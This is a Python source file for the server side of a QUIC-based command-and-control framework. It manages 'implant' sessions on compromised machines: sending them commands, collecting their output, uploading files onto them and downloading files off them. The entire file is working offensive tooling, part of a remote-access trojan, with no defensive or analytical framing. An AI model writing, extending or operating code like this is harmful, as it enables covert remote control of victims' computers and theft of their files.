#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import asyncio
import logging
import os
from typing import Callable, Optional

try:
    from aioquic.asyncio import QuicConnectionProtocol
    from aioquic.quic.events import ConnectionTerminated, StreamDataReceived

    AIOQUIC_AVAILABLE = True
except ImportError:
    AIOQUIC_AVAILABLE = False
    QuicConnectionProtocol = object  # type: ignore[misc,assignment]

try:
    from tqdm import tqdm

    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

logger = logging.getLogger(__name__)

_DL_IDLE = "idle"
_DL_WAIT_SIZE = "wait_size"
_DL_RECV_DATA = "recv_data"


class C2ServerProtocol(QuicConnectionProtocol):
    """QUIC connection handler for a single implant session."""

    def __init__(self, *args, on_connected: Optional[Callable[["C2ServerProtocol"], None]] = None, **kwargs):
        super().__init__(*args, **kwargs)
        self._on_connected = on_connected
        self.command_stream_id: Optional[int] = None
        self.output_buffer = ""

        self._upload_ack = False

        self._dl_state = _DL_IDLE
        self._dl_filesize = 0
        self._dl_received = 0
        self._dl_save_path: Optional[str] = None
        self._dl_file = None
        self._dl_buf = b""

    def connection_made(self, transport):
        super().connection_made(transport)
        logger.info("[QUIC C2] Implant connected")
        if self._on_connected:
            self._on_connected(self)

    def connection_lost(self, exc):
        super().connection_lost(exc)
        logger.info("[QUIC C2] Implant disconnected")

    def quic_event_received(self, event):
        if not isinstance(event, StreamDataReceived):
            if isinstance(event, ConnectionTerminated):
                logger.info("[QUIC C2] Connection terminated: %s", event.reason_phrase)
            return

        raw = event.data

        if self.command_stream_id is None:
            self.command_stream_id = event.stream_id
            logger.info("[QUIC C2] Command stream established: %s", event.stream_id)
            return

        if self._dl_state == _DL_WAIT_SIZE:
            self._dl_buf += raw
            try:
                newline = self._dl_buf.find(b"\n")
                if newline == -1:
                    size_str = self._dl_buf.decode("utf-8", errors="ignore").strip()
                else:
                    size_str = self._dl_buf[:newline].decode("utf-8", errors="ignore").strip()
                    self._dl_buf = self._dl_buf[newline + 1 :]

                if size_str.startswith("ERROR:"):
                    logger.error("[QUIC C2] Implant reported: %s", size_str)
                    self._dl_reset()
                    self.output_buffer = size_str
                    return

                self._dl_filesize = int(size_str)
                self._dl_state = _DL_RECV_DATA
                self._dl_file = open(self._dl_save_path, "wb")
                logger.info(
                    "[QUIC C2] Receiving %s bytes -> %s",
                    self._dl_filesize,
                    self._dl_save_path,
                )

                if self._dl_buf:
                    self._write_dl_chunk(self._dl_buf)
                    self._dl_buf = b""

            except ValueError:
                pass
            return

        if self._dl_state == _DL_RECV_DATA:
            self._write_dl_chunk(raw)
            return

        text = raw.decode("utf-8", errors="ignore").strip()

        if not text or text == "READY":
            return

        if "***Ready for upload***" in text:
            self._upload_ack = True
            return

        if "File successfully uploaded!" in text:
            self.output_buffer = "[QUIC C2] " + text
            return

        self.output_buffer += text

    def _write_dl_chunk(self, data: bytes):
        remaining = self._dl_filesize - self._dl_received
        chunk = data[:remaining]
        self._dl_file.write(chunk)
        self._dl_received += len(chunk)

        if self._dl_filesize:
            pct = int((self._dl_received / self._dl_filesize) * 100)
            print(
                f"\r[QUIC C2] Downloading {os.path.basename(self._dl_save_path)}: {pct}%  ",
                end="",
                flush=True,
            )

        if self._dl_received >= self._dl_filesize:
            self._dl_file.close()
            print()
            logger.info(
                "[QUIC C2] Download complete: %s (%s bytes)",
                self._dl_save_path,
                self._dl_received,
            )
            self.output_buffer = f"DOWNLOAD_DONE|{self._dl_save_path}|{self._dl_received}"
            self._dl_reset()

    def _dl_reset(self):
        self._dl_state = _DL_IDLE
        self._dl_filesize = 0
        self._dl_received = 0
        self._dl_save_path = None
        if self._dl_file:
            try:
                self._dl_file.close()
            except OSError:
                pass
        self._dl_file = None
        self._dl_buf = b""

    def send_command(self, cmd: str) -> bool:
        if self.command_stream_id is None:
            logger.warning("[QUIC C2] No command stream yet")
            return False
        self.output_buffer = ""
        self._quic.send_stream_data(
            self.command_stream_id,
            (cmd + "\n").encode(),
            end_stream=False,
        )
        self.transmit()
        return True

    def send_raw(self, data: bytes) -> bool:
        if self.command_stream_id is None:
            return False
        self._quic.send_stream_data(self.command_stream_id, data, end_stream=False)
        self.transmit()
        return True

    def get_output(self) -> str:
        out = self.output_buffer.strip()
        self.output_buffer = ""
        return out

    @property
    def peer_address(self) -> tuple[str, int]:
        transport = getattr(self, "_transport", None)
        if transport is not None:
            peer = transport.get_extra_info("peername")
            if peer:
                return peer[0], int(peer[1])
        return "0.0.0.0", 0


async def handle_upload(client: C2ServerProtocol, local_path: str, remote_path: str) -> str:
    """Upload a local file to the implant. Returns status message."""
    if not os.path.isfile(local_path):
        return f"[QUIC C2] Local file not found: {local_path}"

    filename = os.path.basename(remote_path)
    filesize = os.path.getsize(local_path)

    client._upload_ack = False
    client.send_command(f":upload:|{filename}|{filesize}")

    for _ in range(20):
        await asyncio.sleep(0.3)
        if client._upload_ack:
            break
    else:
        return "[QUIC C2] Implant never acknowledged upload"

    pbar = None
    if HAS_TQDM:
        pbar = tqdm(total=filesize, unit="B", unit_scale=True, desc=f"Uploading {filename}")

    with open(local_path, "rb") as handle:
        for chunk in iter(lambda: handle.read(4096), b""):
            client.send_raw(chunk)
            if pbar:
                pbar.update(len(chunk))
            await asyncio.sleep(0)

    if pbar:
        pbar.close()

    for _ in range(30):
        await asyncio.sleep(0.3)
        out = client.get_output()
        if out:
            return out

    return "[QUIC C2] No completion ack from implant after upload"


async def handle_download(client: C2ServerProtocol, remote_path: str, local_save: str) -> str:
    """Download a remote file from the implant. Returns status message."""
    client._dl_save_path = local_save
    client._dl_state = _DL_WAIT_SIZE
    client._dl_buf = b""
    client.output_buffer = ""

    client.send_command(f"~download~|{remote_path}")

    for _ in range(400):
        await asyncio.sleep(0.3)
        out = client.get_output()
        if not out:
            continue

        if out.startswith("DOWNLOAD_DONE|"):
            parts = out.split("|")
            return f"[+] File downloaded to {parts[1]} ({parts[2]} bytes)"
        if out.startswith("ERROR:"):
            client._dl_reset()
            return f"[QUIC C2] {out}"

        client.output_buffer = out

    client._dl_reset()
    return "[QUIC C2] Download timed out"
